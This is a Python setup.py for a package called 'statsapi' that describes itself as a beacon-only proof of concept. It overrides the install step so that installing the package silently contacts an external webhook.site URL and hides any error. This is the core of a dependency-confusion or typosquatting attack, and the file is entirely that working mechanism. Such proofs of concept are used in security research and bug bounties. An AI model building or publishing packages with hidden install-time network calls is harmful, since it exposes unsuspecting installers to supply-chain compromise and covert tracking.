from setuptools import setup
from setuptools.command.install import install
import urllib.request

BEACON_URL = "https://webhook.site/617af767-7181-48e7-8027-dce2f35ca687"  # your webhook URL

class InstallWithBeacon(install):
    def run(self):
        try:
            urllib.request.urlopen(BEACON_URL, timeout=3)
        except Exception:
            pass
        install.run(self)

setup(
    name="statsapi",
    version="1.7.2",
    packages=["statsapi"],
    description="POC package (beacon-only)",
    cmdclass={'install': InstallWithBeacon},
)
